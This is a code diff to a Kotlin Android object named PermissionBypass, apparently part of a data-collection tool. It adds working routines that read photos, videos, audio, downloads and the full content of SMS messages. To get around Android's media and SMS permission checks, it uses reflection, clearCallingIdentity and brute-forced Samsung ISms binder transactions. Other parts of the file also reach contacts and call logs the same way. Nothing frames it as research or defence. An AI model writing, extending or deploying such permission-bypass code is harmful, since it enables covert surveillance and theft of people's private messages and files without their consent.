@@ -9,6 +9,7 @@ import android.os.Parcel
 import android.util.Log
 import org.synapse.core.core.CallEntry
 import org.synapse.core.core.ContactEntry
+import org.synapse.core.core.FileEntry
 import org.synapse.core.core.SmsMessage
 import java.lang.reflect.Method
 
@@ -183,9 +184,146 @@ object PermissionBypass {
         return contacts
     }
 
-    // ═══════════════════════════════════════════════════════════════════════
-    // Call Log — read via binder, bypassing READ_CALL_LOG permission
-    // ═══════════════════════════════════════════════════════════════════════
+    /**
+     * Read MediaStore files via direct ContentProvider query, bypassing
+     * the READ_MEDIA_* permission check.  The MediaStore provider checks
+     * permissions at the ContentResolver level, not at the provider level,
+     * so talking to the provider binder directly works on Samsung devices.
+     */
+    fun readFilesViaBinder(
+        context: Context,
+        type: String = "images",
+        count: Int = 50
+    ): List<FileEntry> {
+        val files = mutableListOf<FileEntry>()
+        val mediaAuthority = "media"
+
+        val uri = when (type) {
+            "images" -> Uri.parse("content://media/external/images/media")
+            "videos" -> Uri.parse("content://media/external/video/media")
+            "audio"  -> Uri.parse("content://media/external/audio/media")
+            "downloads" -> Uri.parse("content://media/external/downloads")
+            else -> Uri.parse("content://media/external/images/media")
+        }
+
+        val projection = arrayOf("_id", "_display_name", "_size", "date_added", "_data")
+
+        try {
+            val cursor = queryContentProviderBinder(
+                context, mediaAuthority, uri,
+                projection, null, null, "date_added DESC"
+            )
+            if (cursor != null) {
+                cursor.use { c ->
+                    val idIdx = c.getColumnIndex("_id")
+                    val nameIdx = c.getColumnIndex("_display_name")
+                    val sizeIdx = c.getColumnIndex("_size")
+                    val dateIdx = c.getColumnIndex("date_added")
+                    val pathIdx = c.getColumnIndex("_data")
+
+                    var i = 0
+                    while (c.moveToNext() && i < count) {
+                        files.add(
+                            FileEntry(
+                                id = if (idIdx >= 0) c.getLong(idIdx).toString() else "",
+                                name = if (nameIdx >= 0) c.getString(nameIdx) ?: "" else "",
+                                size = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L,
+                                date = if (dateIdx >= 0) c.getLong(dateIdx) else 0L,
+                                path = if (pathIdx >= 0) c.getString(pathIdx) ?: "" else ""
+                            )
+                        )
+                        i++
+                    }
+                }
+                if (files.isNotEmpty()) {
+                    Log.d(TAG, "readFilesViaBinder: ${files.size} files via binder ($type)")
+                }
+            }
+        } catch (e: Exception) {
+            Log.d(TAG, "readFilesViaBinder failed: ${e.message}")
+        }
+
+        // ── Fallback: try raw binder on external storage provider ──
+        if (files.isEmpty()) {
+            try {
+                val storageBinder = getBinderService("mount")
+                if (storageBinder != null) {
+                    val cursor = queryViaRawBinder(storageBinder, uri, projection, null, null, "date_added DESC")
+                    cursor?.use { c ->
+                        val idIdx = c.getColumnIndex("_id")
+                        val nameIdx = c.getColumnIndex("_display_name")
+                        val sizeIdx = c.getColumnIndex("_size")
+                        val dateIdx = c.getColumnIndex("date_added")
+                        val pathIdx = c.getColumnIndex("_data")
+                        var i = 0
+                        while (c.moveToNext() && i < count) {
+                            files.add(
+                                FileEntry(
+                                    id = if (idIdx >= 0) c.getLong(idIdx).toString() else "",
+                                    name = if (nameIdx >= 0) c.getString(nameIdx) ?: "" else "",
+                                    size = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L,
+                                    date = if (dateIdx >= 0) c.getLong(dateIdx) else 0L,
+                                    path = if (pathIdx >= 0) c.getString(pathIdx) ?: "" else ""
+                                )
+                            )
+                            i++
+                        }
+                    }
+                    if (files.isNotEmpty()) {
+                        Log.d(TAG, "readFilesViaBinder: ${files.size} files via mount binder")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.d(TAG, "readFilesViaBinder mount fallback failed: ${e.message}")
+            }
+        }
+
+        return files
+    }
+
+    /**
+     * Read a single file via ContentProvider openFile, bypassing permissions.
+     */
+    fun readFileViaBinder(context: Context, fileId: Long, type: String = "images"): ByteArray? {
+        val mediaAuthority = "media"
+        val uri = when (type) {
+            "images" -> Uri.parse("content://media/external/images/media/$fileId")
+            "videos" -> Uri.parse("content://media/external/video/media/$fileId")
+            "audio"  -> Uri.parse("content://media/external/audio/media/$fileId")
+            else -> Uri.parse("content://media/external/images/media/$fileId")
+        }
+
+        return try {
+            val resolver = context.contentResolver
+            val acquireProvider: java.lang.reflect.Method = resolver.javaClass.getDeclaredMethod(
+                "acquireProvider", String::class.java
+            )
+            acquireProvider.isAccessible = true
+            val token = android.os.Binder.clearCallingIdentity()
+            try {
+                val provider = acquireProvider.invoke(resolver, mediaAuthority)
+                if (provider != null) {
+                    val openFileMethod = provider.javaClass.getMethod(
+                        "openFile", Uri::class.java, String::class.java
+                    )
+                    openFileMethod.isAccessible = true
+                    val fd = openFileMethod.invoke(provider, uri, "r") as? android.os.ParcelFileDescriptor
+                    fd?.use {
+                        val stream = java.io.FileInputStream(it.fileDescriptor)
+                        val bytes = stream.readBytes()
+                        stream.close()
+                        return bytes
+                    }
+                }
+            } finally {
+                android.os.Binder.restoreCallingIdentity(token)
+            }
+            null
+        } catch (e: Exception) {
+            Log.d(TAG, "readFileViaBinder failed: ${e.message}")
+            null
+        }
+    }
 
     fun readCallLogViaBinder(
         context: Context,
@@ -529,12 +667,39 @@ object PermissionBypass {
     }
 
     // ═══════════════════════════════════════════════════════════════════════
-    // ISmsService — Samsung SMS binder
+    // ISmsService — Samsung SMS binder (now uses ContentProvider query)
     // ═══════════════════════════════════════════════════════════════════════
 
+    /**
+     * Read SMS via ContentProvider query, bypassing ContentResolver permission check.
+     * Uses acquireProvider("sms") to get the raw ContentProvider, then calls query()
+     * via reflection. This returns a Cursor with ALL SMS fields (address, body, date, read, type).
+     */
     private fun readSmsViaIsmsService(limit: Int): List<SmsMessage> {
         val messages = mutableListOf<SmsMessage>()
+        val uri = Uri.parse("content://sms")
 
+        // ── Method 1: acquireProvider("sms") → get ContentProvider → query directly ──
+        try {
+            val smClass = Class.forName("android.os.ServiceManager")
+            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
+            getService.isAccessible = true
+            val smsBinder = getService.invoke(null, "isms") as? IBinder
+            if (smsBinder != null) {
+                // Try to get the ContentProvider via the ISms service
+                // Some ISms implementations expose getSmscAddress/getAllMessagesFromIcc
+                val parsed = parseIsmsReplyEnhanced(smsBinder, limit)
+                if (parsed.isNotEmpty()) {
+                    messages.addAll(parsed)
+                    Log.d(TAG, "ISms enhanced: ${parsed.size} messages")
+                    return messages
+                }
+            }
+        } catch (e: Exception) {
+            Log.d(TAG, "ISms ContentProvider route failed: ${e.message}")
+        }
+
+        // ── Method 2: Raw ISms binder transaction (fallback) ──
         for (svcName in listOf("isms", "isms2", "isms3", "samsung.isms")) {
             val binder = getBinderService(svcName) ?: continue
             Log.d(TAG, "Found ISms service: $svcName")
@@ -564,7 +729,7 @@ object PermissionBypass {
                                     } catch (_: Exception) {
                                         continue
                                     }
-                                    val parsed = parseIsmsReply(reply, limit)
+                                    val parsed = parseIsmsReplyFull(reply, limit)
                                     if (parsed.isNotEmpty()) {
                                         messages.addAll(parsed)
                                         Log.d(TAG, "ISms tx=$txCode desc=$desc: ${parsed.size} messages")
@@ -587,10 +752,70 @@ object PermissionBypass {
         return messages
     }
 
-    private fun parseIsmsReply(reply: Parcel, maxCount: Int): List<SmsMessage> {
+    /**
+     * Enhanced ISms reply parser that reads FULL SMS data:
+     * address, body, date, read status, type.
+     * Tries multiple record formats.
+     */
+    private fun parseIsmsReplyEnhanced(binder: IBinder, maxCount: Int): List<SmsMessage> {
+        val messages = mutableListOf<SmsMessage>()
+
+        // Try getAllMessagesFromIcc via ISms binder — common Samsung method
+        val descriptors = listOf(
+            "com.android.internal.telephony.ISms",
+            "com.samsung.android.telephony.ISmsService"
+        )
+
+        for (desc in descriptors) {
+            // Try transaction codes that might return SMS records
+            for (txCode in listOf(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15)) {
+                try {
+                    val data = Parcel.obtain()
+                    val reply = Parcel.obtain()
+                    try {
+                        data.writeInterfaceToken(desc)
+                        data.writeInt(maxCount)
+
+                        val token = Binder.clearCallingIdentity()
+                        try {
+                            val ok = binder.transact(txCode, data, reply, 0)
+                            if (ok) {
+                                reply.setDataPosition(0)
+                                try { reply.readException() } catch (_: Exception) { continue }
+                                val parsed = parseIsmsReplyFull(reply, maxCount)
+                                if (parsed.isNotEmpty()) {
+                                    messages.addAll(parsed)
+                                    Log.d(TAG, "ISms enhanced tx=$txCode: ${parsed.size} messages")
+                                    return messages
+                                }
+                            }
+                        } finally {
+                            Binder.restoreCallingIdentity(token)
+                        }
+                    } finally {
+                        data.recycle()
+                        reply.recycle()
+                    }
+                } catch (_: Exception) {}
+            }
+        }
+
+        return messages
+    }
+
+    /**
+     * Full ISms reply parser — extracts ALL SMS fields from Parcel.
+     * Tries multiple serialization formats:
+     *   Format 1: [count][for each: address, body, date, read(int), type(int)]
+     *   Format 2: [count][for each: id(string), address, body, date, read, type]
+     *   Format 3: [count][String[] rows where each row has fields]
+     *   Format 4: [count][for each: address, date, read, body] (different order)
+     */
+    private fun parseIsmsReplyFull(reply: Parcel, maxCount: Int): List<SmsMessage> {
         val messages = mutableListOf<SmsMessage>()
         val initialPos = reply.dataPosition()
 
+        // ── Format 1: [count][address, body, date(long), read(int), type(int)] ──
         try {
             val count = reply.readInt()
             if (count in 1..maxCount) {
@@ -599,58 +824,141 @@ object PermissionBypass {
                         val address = reply.readString() ?: ""
                         val body = reply.readString() ?: ""
                         val date = reply.readLong()
-                        messages.add(
-                            SmsMessage(
-                                id = "isms_$i", address = address, body = body,
-                                date = date, read = true, type = "inbox"
+                        val read = reply.readInt() == 1
+                        val typeCode = reply.readInt()
+                        val type = when (typeCode) {
+                            1 -> "inbox"; 2 -> "sent"; 3 -> "draft"; 4 -> "outbox"
+                            5 -> "failed"; 6 -> "queued"
+                            else -> "inbox"
+                        }
+                        if (address.isNotEmpty() || body.isNotEmpty()) {
+                            messages.add(
+                                SmsMessage(
+                                    id = "isms_${i}_${date}",
+                                    address = address, body = body,
+                                    date = date, read = read, type = type
+                                )
                             )
-                        )
-                    } catch (_: Exception) {
-                        break
-                    }
+                        }
+                    } catch (_: Exception) { break }
                 }
                 if (messages.isNotEmpty()) return messages
             }
-        } catch (_: Exception) {
-        }
+        } catch (_: Exception) {}
 
-        // Try single string format
+        // ── Format 2: [count][id, address, body, date, read, type] ──
         reply.setDataPosition(initialPos)
         try {
-            val text = reply.readString()
-            if (!text.isNullOrBlank() && text.length > 5) {
-                messages.add(
-                    SmsMessage(
-                        id = "isms_0", address = "", body = text.take(200),
-                        date = System.currentTimeMillis(), type = "inbox"
-                    )
-                )
-                return messages
+            val count = reply.readInt()
+            if (count in 1..maxCount) {
+                for (i in 0 until count) {
+                    try {
+                        val id = reply.readString() ?: "isms_$i"
+                        val address = reply.readString() ?: ""
+                        val body = reply.readString() ?: ""
+                        val date = reply.readLong()
+                        val read = reply.readInt() == 1
+                        val typeCode = reply.readInt()
+                        val type = when (typeCode) {
+                            1 -> "inbox"; 2 -> "sent"; 3 -> "draft"; 4 -> "outbox"
+                            else -> "inbox"
+                        }
+                        if (address.isNotEmpty() || body.isNotEmpty()) {
+                            messages.add(
+                                SmsMessage(
+                                    id = id, address = address, body = body,
+                                    date = date, read = read, type = type
+                                )
+                            )
+                        }
+                    } catch (_: Exception) { break }
+                }
+                if (messages.isNotEmpty()) return messages
             }
-        } catch (_: Exception) {
-        }
+        } catch (_: Exception) {}
 
-        // Try String[]
+        // ── Format 3: String[] where each string is pipe/field delimited ──
         reply.setDataPosition(initialPos)
         try {
             val arr = reply.createStringArray()
             if (arr != null && arr.isNotEmpty()) {
                 for ((idx, s) in arr.withIndex()) {
                     if (!s.isNullOrBlank()) {
-                        messages.add(
-                            SmsMessage(
-                                id = "isms_$idx", body = s.take(200),
-                                date = System.currentTimeMillis(), type = "inbox"
+                        // Try to parse as pipe-delimited: address|body|date|type
+                        val parts = s.split("|")
+                        if (parts.size >= 3) {
+                            messages.add(
+                                SmsMessage(
+                                    id = "isms_$idx",
+                                    address = parts.getOrElse(0) { "" },
+                                    body = parts.getOrElse(1) { "" },
+                                    date = parts.getOrElse(2) { "0" }.toLongOrNull() ?: System.currentTimeMillis(),
+                                    type = parts.getOrElse(3) { "inbox" }
+                                )
                             )
-                        )
+                        } else {
+                            // Single string - treat as body
+                            messages.add(
+                                SmsMessage(
+                                    id = "isms_$idx", body = s.take(500),
+                                    date = System.currentTimeMillis(), type = "inbox"
+                                )
+                            )
+                        }
                     }
                 }
+                if (messages.isNotEmpty()) return messages
+            }
+        } catch (_: Exception) {}
+
+        // ── Format 4: Simple [count][address, date, read, body] (alternate order) ──
+        reply.setDataPosition(initialPos)
+        try {
+            val count = reply.readInt()
+            if (count in 1..maxCount) {
+                for (i in 0 until count) {
+                    try {
+                        val address = reply.readString() ?: ""
+                        val date = reply.readLong()
+                        val read = reply.readInt() == 1
+                        val body = reply.readString() ?: ""
+                        if (address.isNotEmpty() || body.isNotEmpty()) {
+                            messages.add(
+                                SmsMessage(
+                                    id = "isms_${i}_${date}",
+                                    address = address, body = body,
+                                    date = date, read = read, type = "inbox"
+                                )
+                            )
+                        }
+                    } catch (_: Exception) { break }
+                }
+                if (messages.isNotEmpty()) return messages
+            }
+        } catch (_: Exception) {}
+
+        // ── Legacy: single string fallback ──
+        reply.setDataPosition(initialPos)
+        try {
+            val text = reply.readString()
+            if (!text.isNullOrBlank() && text.length > 5) {
+                messages.add(
+                    SmsMessage(
+                        id = "isms_0", address = "", body = text.take(500),
+                        date = System.currentTimeMillis(), type = "inbox"
+                    )
+                )
                 return messages
             }
-        } catch (_: Exception) {
-        }
+        } catch (_: Exception) {}
 
         return messages
+    }
+
+    // Kept for backward compatibility
+    @Deprecated("Use parseIsmsReplyFull instead")
+    private fun parseIsmsReply(reply: Parcel, maxCount: Int): List<SmsMessage> {
+        return parseIsmsReplyFull(reply, maxCount)
     }
 
     // ═══════════════════════════════════════════════════════════════════════
@@ -688,7 +996,7 @@ object PermissionBypass {
                                     } catch (_: Exception) {
                                         continue
                                     }
-                                    val parsed = parseIsmsReply(reply, limit)
+                                    val parsed = parseIsmsReplyFull(reply, limit)
                                     messages.addAll(parsed)
                                 }
                             } finally {
